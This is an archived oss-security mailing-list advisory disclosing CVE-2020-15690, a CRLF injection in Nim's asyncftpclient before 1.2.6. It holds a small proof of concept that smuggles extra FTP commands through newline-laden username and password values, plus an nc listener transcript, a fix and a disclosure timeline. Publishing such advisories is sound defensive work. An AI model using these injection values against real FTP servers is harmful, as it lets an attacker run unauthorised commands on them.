X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2884" "Thursday" "4" "February" "2021" "15:58:23" "+0100" "Martin Ortner" "martin.ortner@consensys.net" "<F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>" "115" "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" nil nil nil "2" "2021020414:58:23" "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" (number mark "U       martin.ortne Feb  4  115/2884  " thread-indent "\"[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32554 invoked by uid 550); 4 Feb 2021 15:14:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25722 invoked from network); 4 Feb 2021 14:58:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=consensys.net; s=google;
        h=from:content-transfer-encoding:mime-version:subject:message-id:date
         :to;
        bh=LC/CtskIU5zUqjnT1WDFqo3Z88ZzuvKuovar+jf9cfM=;
        b=Y89ag2m3L6srgAjyxwgk09PHAZPAPADdk1UwWmjuh8ObZWN+gxQbuGnkc80RyhqkYj
         DHbNy63Q6cnBjfKravsf1fo/I2QYQZ6Djl+yB+XE0fFW+DeuipEub/0kYKNNDqnvRcgG
         cLGjw6lbC1f2pkdhw0jnoKvHw4rZIAe9Z9T4yGPyJVrHkKlYxiZ0NhsRQFvOpWKPpnN5
         4d1xL5zO0ME/H6tdgqTYBxGvGCkRvMCBhinjrwEgXLbkhiU72lkauzu7cDL6qsFnFXHX
         g69ZIaGCchBygrVD0nLfyUiRr/bG3N24dZ88YXluRm0qYMRuMxDiZspFl6IQS/hZmCP1
         PrIA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:content-transfer-encoding:mime-version
         :subject:message-id:date:to;
        bh=LC/CtskIU5zUqjnT1WDFqo3Z88ZzuvKuovar+jf9cfM=;
        b=Q6R4wzHtvQzhHDLVMAcaI6MKIaJ4kUINP0aXLPisjvP3QdoMbm6PK9Wyhn1qE1gI7B
         SGhe3V1aZaFQydkHobgJ5IZ1BojkNb8dNirc+bSw65WBpAfTEV8V+kBmt1DZI7YSh1Ww
         zZYV3wng9IsHG+Pvyk4KIshaT61sQ8obwPK6iHbWZLm7RzG/nJ+vfz4D7EGlgQdsEcS8
         liITRZxeGEXk5BqasIGRugJINvjHgERgjZTYlSjx6qTENMStHzGU8NSN81y1P+tAwFG1
         B9PIr1LcI033977sL9LYBqJJu4bUKsKVhDT7cdCK7cxwXL7owZqgRi7kF3X42tHl0nOm
         OiQQ==
X-Gm-Message-State: AOAM532IlknevVF3qDf5JFsbAWUuMrAGnLPyZ8cACUBeHbX8ZvUm005n
	Ze+9C94nmJ1hlFjbAua842i1NxB2kysdRGdtPx4R87fIkrjHZG+njx5VQyiHQ1gSg+5U3etGVP3
	Pfg4dZDmzlBsrLeMATvwF8sqOt4t2D+kUddGWkNx9iDlD7bQOzv7WmRBXXlCqHD8y5c7YCjepP1
	6duGrF84ACavj7fT8sqtI=
X-Google-Smtp-Source: ABdhPJw5KKsQ5ArEk+70yRY+/YiSvWR5Ydh8461cMRwF3R+0bO9ln1FyJShxg/knS/sqiYXTvkfmAA==
X-Received: by 2002:a1c:2092:: with SMTP id g140mr8027172wmg.4.1612450705849;
        Thu, 04 Feb 2021 06:58:25 -0800 (PST)
From: Martin Ortner <martin.ortner@consensys.net>
Content-Type: text/plain;
	charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 13.4 \(3608.120.23.2.4\))
Message-Id: <F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>
Date: Thu, 4 Feb 2021 15:58:23 +0100
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3608.120.23.2.4)
Subject: [oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection

title: "Nim - stdlib asyncftpd - Crlf Injection"
date: 2021-02-04T15:25:49+01:00

cve: ["CVE-2020-15690"]
vendor: nim-lang
vendorUrl: https://nim-lang.org/
authors: tintinweb
affectedVersions: [ "< 1.2.6" ]
vulnClass: CWE-93

Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-asy=
ncftpd-crlf-injection/
Vulnerability Note: https://github.com/tintinweb/pub/tree/master/pocs/cve-2=
020-15690
Group: https://consensys.net/diligence/research/



# Vulnerability Note

## Summary=20

In Nim before 1.2.6, the standard library asyncftpclient lacks a check for =
whether a message contains a newline character.

## Details

### Description

The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF`=
 injections. An injection is possible if the attacker controls any argument=
 that is passed to the remote server such as the `username` and `password` =
to `newAsyncFtpClient`.=20


The root cause of this issue is that the `send(ftp, msg)` allows `msg` to c=
ontain `CR-LF` control characters. An attacker that controls any unchecked =
input to `send()` can therefore inject arbitrary FTP commands.=20

```nim
proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.}=
 =3D
  ## Send a message to the server, and wait for a primary reply.
  ## ``\c\L`` is added for you.
  ##
  ## **Note:** The server may return multiple lines of coded replies.
  await ftp.csock.send(m & "\c\L")
  return await ftp.expectReply()
```


### Proof of Concept

Note: `nim c -r -d:ssl  crlf_inject.nim`

* Injecting FTP commands via `user` and `pass`

```nim
import asyncdispatch, asyncftpclient
proc main() {.async.} =3D
  var ftp =3D newAsyncFtpClient("localhost", user =3D "test\nINJECTED_LINE =
test test", pass =3D "test\nINJECTED_LINE test test 2")
  await ftp.connect()
  echo("Connected")
waitFor(main())
```

Output:

```
=E2=87=92 nim c -r -d:ssl  crlf_inject.nim
...
Hint: 104717 LOC; 1.030 sec; 113.309MiB peakmem; Debug build; proj: /Users/=
tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject.nim; out: /User=
s/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject  [=
Exec]
Connected
```


```
=E2=87=92  nc -l 21
220 fake ftp
USER test
INJECTED_LINE test test
230 Hi test, thanks for injecting a line...
PASS test
INJECTED_LINE test test 2
230 thx for injecting another line...
```

### Proposed Fix

- properly validate user input
- raise an exception if `CR` or `LF` if found in the `msg` passed to `send(=
)`=20

## Vendor Response

Vendor response: fixed in 1.2.6

### Timeline

```
JUL/13/2020 - contact dom96//AT//telegram; provided details, PoC
FEB/04/2020 - public disclosure
```

## References

* [1] https://nim-lang.org/
* [2] https://nim-lang.org/install.html
* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)

